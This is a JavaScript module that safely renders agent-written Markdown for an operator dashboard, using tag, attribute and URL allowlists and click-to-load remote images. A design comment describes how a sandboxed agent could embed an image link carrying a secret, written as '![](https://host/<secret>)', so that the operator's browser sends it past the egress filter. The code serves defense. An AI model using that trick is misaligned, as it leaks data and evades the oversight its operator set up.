// Markdown source → a plain document tree, with no Preact and no DOM.
//
// The dashboard never asks markdown-it for an HTML string, and so never has an
// HTML string to inject. markdown-it parses (with its own HTML support off) to
// a token stream; this module walks that stream into `{ tag, attrs, children }`
// nodes drawn from the allowlists below, and markdown-document.js turns those
// into Preact vnodes. Text from an agent-published file therefore reaches the
// DOM only as a text node or as an attribute value that passed a check here.
// No markup string is built or assigned anywhere on the path, which is why the
// Markdown viewer needs no imperative-boundary exemption.
//
// Keeping the walk free of Preact is also what lets jstest exercise it
// directly, without a DOM.

// markdown-it is ~130 KiB of parser that only a notification carrying a
// Markdown file ever needs, so it is imported on demand rather than pulled into
// the dashboard's boot graph. The import map in dashboard.html resolves the
// bare specifier to the vendored module. One parser is shared by every viewer.
let parserPromise = null;

export function loadMarkdownParser() {
  if (!parserPromise) {
    parserPromise = import('markdown-it').then(({ default: MarkdownIt }) => new MarkdownIt({
      // html:false is load-bearing, not a preference: it makes markdown-it emit
      // raw HTML in the source as text tokens instead of markup tokens, so an
      // agent cannot smuggle an element past the allowlists below.
      html: false,
      // Bare URLs in an agent's document become links, matching how the plain
      // notification body already treats them.
      linkify: true,
      typographer: false,
      breaks: false,
    })).catch((error) => {
      // A failed load must not poison every later open: the next viewer retries.
      parserPromise = null;
      throw error;
    });
  }
  return parserPromise;
}

// Elements the viewer will build. This is what markdown-it's default preset
// (CommonMark plus tables and strikethrough) can produce, and nothing else — an
// unlisted tag is dropped and its children are kept, so a future parser option
// degrades to unstyled content rather than to markup we never reviewed.
const ALLOWED_TAGS = new Set([
  'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'hr', 'br',
  'ul', 'ol', 'li', 'pre', 'code', 'em', 'strong', 's', 'a', 'img',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
]);

// The only schemes an anchor may carry, and only spelled absolutely (see
// safeURL). markdown-it's own validateLink already rejects javascript:,
// vbscript: and file:, but the viewer does not rely on a parser option for the
// property that matters most here.
const LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

// A self-contained data: URI. Such an image reaches nothing, so it renders on
// sight. No SVG: it carries script.
//
// The four types are markdown-it's own set (its GOOD_DATA_RE), not the wider
// one the attachment thumbnail trusts — that also admits AVIF. Listing more
// here would change nothing, because the parser refuses any other data: target
// before this module is asked about it, so an inline AVIF stays visible as the
// reference the author typed. An AVIF ATTACHMENT is unaffected: it is
// `previewable`, and reaches the document by name rather than by data: URI.
const DATA_IMAGE = /^data:image\/(?:gif|png|jpeg|webp);base64,[a-z0-9+/]+=*$/i;

// The schemes a remote image may name. Anything else — data: that is not a
// trusted raster, javascript:, ftp:, file: — is not an image target at all.
const REMOTE_IMAGE_SCHEMES = new Set(['http:', 'https:']);

// ...and it must name an authority, which the scheme alone does not settle.
// `https:./x.png` parses as https with a host of "."; the browser, resolving
// that same string against the DOCUMENT's base, lands on this origin instead.
// Requiring the `//` keeps the two readings identical, so the src the viewer
// holds back is the src the browser would fetch and the host in the
// placeholder is the host that would really be contacted.
const REMOTE_IMAGE_AUTHORITY = /^https?:\/\//i;

// REMOTE_IMAGE is the node a document's remote image becomes: a placeholder
// the operator can turn into a real <img> with one click, rendered by
// markdown-remote-image.js.
//
// It is deliberately not an element name. walk() only ever builds tags out of
// ALLOWED_TAGS, and this is not in that set, so no document can produce one of
// these nodes by writing markup — it exists only because resolveImageSource
// decided an image was remote.
//
// Why a remote image is not simply fetched, which is what every other Markdown
// renderer does. An <img> is the only thing in a document that reaches the
// network on its own, with no click — and the document's author is an agent
// that may be running behind this project's own egress boundary (see
// docs/linux-network-filtering.md: default-drop nftables plus a DNS broker
// admitting only authored names). Rendered eagerly, an agent could write
// `![](https://host/<secret>)`, wait for the operator to open the report, and
// have the operator's UNFILTERED browser make the request the agent could not
// — turning the viewer into a way around the sandbox the operator configured.
// `referrerpolicy` does not help: it hides which host asked, not that the
// request happened at all.
//
// Holding the fetch until the operator asks for it keeps that property (no
// request the operator did not choose) while still letting them see the
// picture. The placeholder names the host, so the choice is an informed one.
export const REMOTE_IMAGE = 'remote-image';

// Table-cell alignment is the one inline style markdown-it emits.
const TEXT_ALIGN = /^text-align:\s*(?:left|center|right)$/i;

// Fence languages become a class the stylesheet can hook, with the language
// name reduced to the characters an informative label needs.
const LANGUAGE_CLASS = /^language-[a-z0-9_.+-]{1,32}$/i;

function safeURL(value) {
  const raw = String(value ?? '').trim();
  if (!raw) return null;
  let parsed;
  try {
    // Parsed with NO base, so only an absolute URL naming its own scheme
    // survives. That rejects javascript:, data: and file: by scheme, and
    // rejects the relative forms — `./notes.md`, `/api/x`, `#section`,
    // `//host/y` — for a different reason: the author meant them to resolve
    // against their own repository, and the only thing they can actually
    // resolve against here is the dashboard's origin. A link that would
    // silently retarget at the operator's own daemon is worse than no link.
    parsed = new URL(raw);
  } catch {
    return null;
  }
  return LINK_SCHEMES.has(parsed.protocol) ? raw : null;
}

// A document refers to a file published alongside it the way its author wrote
// it on the command line: `![map](map.png)` next to `--attach map.png`. Names
// are compared after dropping a leading `./` and folding case, and after
// percent-decoding — markdown-it normalizes `map two.png` to `map%20two.png`,
// which is not what the operator sees in the attachment card. Both spellings
// are indexed and both are looked up, so a filename containing a literal `%`
// still matches itself.
function imageNameKeys(value) {
  const raw = String(value ?? '').trim().replace(/^\.\//, '');
  if (!raw) return [];
  const keys = [raw.toLowerCase()];
  try {
    const decoded = decodeURIComponent(raw).replace(/^\.\//, '').toLowerCase();
    if (decoded && decoded !== keys[0]) keys.push(decoded);
  } catch {
    // A malformed escape sequence is compared as it was written.
  }
  return keys;
}

// A name two different published files both answer to. Kept in the index in
// place of a route, because "which of these did the author mean" has no answer
// and picking one silently shows the operator a picture chosen by the order the
// files happened to arrive in.
const AMBIGUOUS = Symbol('ambiguous attachment name');

// attachmentImageIndex maps the names a document can use onto the download
// routes of the images published with it.
//
// Only files the daemon has already confirmed are raster images (`previewable`
// — content-sniffed, SVG excluded) are indexed, which is the same bar the
// attachment card's own thumbnail passes. Everything else a notification can
// carry — an SVG, the document itself, a payload whose bytes do not match its
// declared type — is not something the viewer will build an <img> for, so a
// reference to it degrades to alt text rather than to a broken image.
function attachmentImageIndex(attachments) {
  const index = new Map();
  for (const attachment of attachments || []) {
    if (!attachment?.previewable) continue;
    const url = String(attachment.url ?? '');
    // The route is the daemon's to mint, and every one it mints is a
    // root-relative path on this origin. Checking the shape rather than
    // trusting the field keeps the module's own invariant true — an image src
    // is inline, or it is same-origin, or it is held back — whatever a future
    // snapshot puts in `url`.
    //
    // The second character is what decides it, and BOTH separators have to be
    // refused: `//host/x` is a protocol-relative absolute URL, and for a
    // special scheme the URL parser reads a backslash as a slash, so
    // `/\host/x` resolves to that host just the same. Tab and newline are
    // refused outright rather than reasoned about, because the parser DELETES
    // them before it parses — `/<tab>/host/x` reads as `//host/x` — so any
    // shape test that runs on the raw string is testing a different string
    // than the one that will be resolved.
    if (/[\t\n\r]/.test(url) || !/^\/(?![/\\])/.test(url)) continue;
    for (const key of imageNameKeys(attachment.filename)) {
      // Two files can answer to one key: published under the same name, under
      // names differing only in case, or as a percent-encoded spelling of each
      // other. Whichever it is, the key stops identifying a file, and a name
      // that identifies no single file resolves to no image at all.
      if (!index.has(key)) index.set(key, url);
      else if (index.get(key) !== url) index.set(key, AMBIGUOUS);
    }
  }
  return index;
}

// lookupAttachmentImage answers with a route, with AMBIGUOUS, or with null when
// nothing published answers to the name. The first key that matches decides,
// including when what it decides is that the name is ambiguous — falling
// through to the next spelling would be the same silent guess by another route.
function lookupAttachmentImage(index, name) {
  for (const key of imageNameKeys(name)) {
    const found = index.get(key);
    if (found) return found;
  }
  return null;
}

// resolveImageSource decides which of the three kinds of image target this is,
// and what the viewer should build for it. Null means none of them, and the
// caller degrades to the alt text.
function resolveImageSource(value, index) {
  const raw = String(value ?? '').trim();
  if (!raw) return null;
  if (DATA_IMAGE.test(raw)) return { tag: 'img', src: raw };
  let parsed = null;
  try {
    // No base, so this succeeds only for a target naming its own scheme. The
    // failure is the interesting case: it means a relative target, which is
    // how a document names a file published with it.
    parsed = new URL(raw);
  } catch {
    // Fall through to the published-file lookup below.
  }
  if (parsed) {
    if (!REMOTE_IMAGE_SCHEMES.has(parsed.protocol)) return null;
    return REMOTE_IMAGE_AUTHORITY.test(raw) ? { tag: REMOTE_IMAGE, src: raw } : null;
  }
  // The route is the daemon's own, same-origin and authenticated, holding bytes
  // the operator's daemon already stores. Loading it tells no third party
  // anything, so unlike a remote image it needs no click.
  let found = lookupAttachmentImage(index, raw);
  if (found === null) {
    // A cache-busting query or an anchor is something an author writes without
    // thinking; neither can be part of a published filename that matched
    // nothing, so try again without it rather than silently dropping the
    // picture. The exact spelling is tried FIRST, so a file whose name really
    // does contain one still matches itself.
    const bare = raw.replace(/[?#].*$/, '');
    if (bare !== raw) found = lookupAttachmentImage(index, bare);
  }
  // A route renders. AMBIGUOUS and null both mean the viewer cannot say which
  // picture was meant, and a relative name matching nothing published, a
  // protocol-relative `//host/x` or an absolute path would resolve against the
  // dashboard's own origin, which is never what the author meant. All of them
  // keep the author's words instead.
  return typeof found === 'string' ? { tag: 'img', src: found } : null;
}

// attributesFor keeps only what each element is allowed to carry, and checks
// the value rather than trusting it. Everything markdown-it produces that is
// not listed is dropped.
function attributesFor(tag, attrs) {
  const source = new Map((attrs || []).map(([name, value]) => [String(name).toLowerCase(), value]));
  const out = {};
  const title = source.get('title');
  if (title) out.title = String(title);

  if (tag === 'a') {
    const href = safeURL(source.get('href'));
    if (!href) return out;
    out.href = href;
    // A document's links leave the dashboard, so they open in a new context
    // and are denied a handle back to this one.
    out.target = '_blank';
    out.rel = 'noopener noreferrer';
    return out;
  }
  // 'img' has no branch here on purpose: an image's src is not a value to
  // check but a choice between three outcomes, so imageNode owns it.
  if (tag === 'ol') {
    const start = Number.parseInt(source.get('start'), 10);
    if (Number.isInteger(start) && start > 0) out.start = start;
    return out;
  }
  if (tag === 'th' || tag === 'td') {
    const style = String(source.get('style') ?? '');
    if (TEXT_ALIGN.test(style)) out.style = style;
    return out;
  }
  if (tag === 'code') {
    const className = String(source.get('class') ?? '');
    if (LANGUAGE_CLASS.test(className)) out.class = className;
    return out;
  }
  return out;
}

function element(tag, attrs, children = []) {
  return { tag, attrs, children };
}

// An image's alt text is a nested inline token stream in markdown-it, not the
// (always empty) alt attribute, so flatten it to the characters it describes.
function inlineText(tokens) {
  return tokens.map((token) => {
    if (token.children?.length) return inlineText(token.children);
    if (token.type === 'softbreak' || token.type === 'hardbreak') return ' ';
    return token.content || '';
  }).join('');
}

// image is the one leaf element whose target can be refused. An image the
// viewer will not load is worth less than the words the author wrote about it,
// so a rejected src degrades to the alt text rather than to a broken icon.
function imageNode(token, index) {
  const attrs = attributesFor('img', token.attrs);
  const alt = inlineText(token.children || []);
  const src = (token.attrs || []).find(([name]) => String(name).toLowerCase() === 'src')?.[1];
  const resolved = resolveImageSource(src, index);
  if (!resolved) return alt;
  if (resolved.tag === REMOTE_IMAGE) {
    // No `loading` here: the placeholder is what renders, and the real <img>
    // is built by markdown-remote-image.js only once the operator asks for it.
    return element(REMOTE_IMAGE, { ...attrs, src: resolved.src, alt }, []);
  }
  return element('img', { ...attrs, src: resolved.src, alt, loading: 'lazy' }, []);
}

function codeBlock(token) {
  // token.info is the fence's info string ("js", "bash args…"); its first word
  // is the language. attributesFor re-checks the class it becomes.
  const language = String(token.info || '').trim().split(/\s+/)[0];
  const attrs = language ? [['class', `language-${language}`]] : [];
  return element('pre', {}, [element('code', attributesFor('code', attrs), [token.content])]);
}

// walk turns one token list into nodes. markdown-it emits a flat stream where
// container elements are an opening token (nesting 1) and a closing token
// (nesting -1) around their content, so the walk keeps a stack of open
// elements. `inline` tokens carry their own child stream.
function walk(tokens, index) {
  const root = element(null, {}, []);
  const stack = [root];
  const top = () => stack[stack.length - 1];

  for (const token of tokens) {
    switch (token.type) {
      case 'inline':
        // Appended one at a time rather than spread: a single paragraph of a
        // large document can carry more inline nodes than an argument list
        // holds, and blowing the stack would lose the whole document.
        for (const node of walk(token.children || [], index)) top().children.push(node);
        continue;
      case 'text':
        if (token.content) top().children.push(token.content);
        continue;
      // With html:false these two cannot occur. Handling them as text anyway
      // means that if a future option ever turns markdown-it's HTML support
      // back on, the markup is displayed rather than honoured.
      case 'html_block':
      case 'html_inline':
        if (token.content) top().children.push(token.content);
        continue;
      case 'code_inline':
        top().children.push(element('code', {}, [token.content]));
        continue;
      case 'image':
        top().children.push(imageNode(token, index));
        continue;
      case 'fence':
      case 'code_block':
        top().children.push(codeBlock(token));
        continue;
      case 'softbreak':
        top().children.push('\n');
        continue;
      case 'hardbreak':
        top().children.push(element('br', {}, []));
        continue;
      default:
        break;
    }
    if (token.hidden) continue;

    const tag = String(token.tag || '').toLowerCase();
    const allowed = ALLOWED_TAGS.has(tag);
    if (token.nesting === 1) {
      const attrs = allowed ? attributesFor(tag, token.attrs) : null;
      // Two ways to end up transparent: a container this walk does not build at
      // all, and an anchor whose target was refused. An anchor with no href is
      // not a link, and leaving one behind would render as link-coloured text
      // that silently does nothing when the operator clicks it — so the words
      // survive and the anchor does not, the same way a refused image degrades
      // to its alt text. Pushing the current top again keeps the stack balanced
      // against the closing token either way.
      if (!allowed || (tag === 'a' && !attrs.href)) {
        stack.push(top());
        continue;
      }
      const node = element(tag, attrs, []);
      top().children.push(node);
      stack.push(node);
    } else if (token.nesting === -1) {
      if (stack.length > 1) stack.pop();
    } else if (allowed) {
      top().children.push(element(tag, attributesFor(tag, token.attrs), []));
    }
  }
  return root.children;
}

// markdownToTree parses Markdown source into the viewer's document tree. Nodes
// are `{ tag, attrs, children }`; a child that is a string is literal text.
//
// `attachments` is the list of files published with the same notification, in
// the dashboard snapshot's shape (`filename`, `url`, `previewable`). It is what
// lets `![map](map.png)` in a report resolve to the image attached beside it.
export function markdownToTree(parser, source, { attachments } = {}) {
  // A leading byte-order mark is legal in a UTF-8 file and the daemon's sniff
  // accepts one, but markdown-it does not strip it — left in place it glues
  // itself to the first `#` and turns the document's title into a paragraph.
  const text = String(source ?? '').replace(/^\uFEFF/, '');
  if (!text.trim()) return [];
  return walk(parser.parse(text, {}), attachmentImageIndex(attachments));
}

// remoteImageSources lists the src of every remote image in a rendered tree, in
// document order, one entry per placeholder rather than one per distinct URL.
// The viewer counts them to tell the operator how many placeholders are on
// screen — a document that shows the same URL twice shows two of them — and
// the count has to match what they can see. Loading still works by URL, so the
// two occurrences resolve together; a Set at the call site collapses them.
export function remoteImageSources(nodes) {
  const found = [];
  const stack = [...(nodes || [])].reverse();
  while (stack.length) {
    const node = stack.pop();
    if (typeof node === 'string' || !node) continue;
    if (node.tag === REMOTE_IMAGE) {
      found.push(node.attrs.src);
      continue;
    }
    for (let i = (node.children || []).length - 1; i >= 0; i -= 1) stack.push(node.children[i]);
  }
  return found;
}
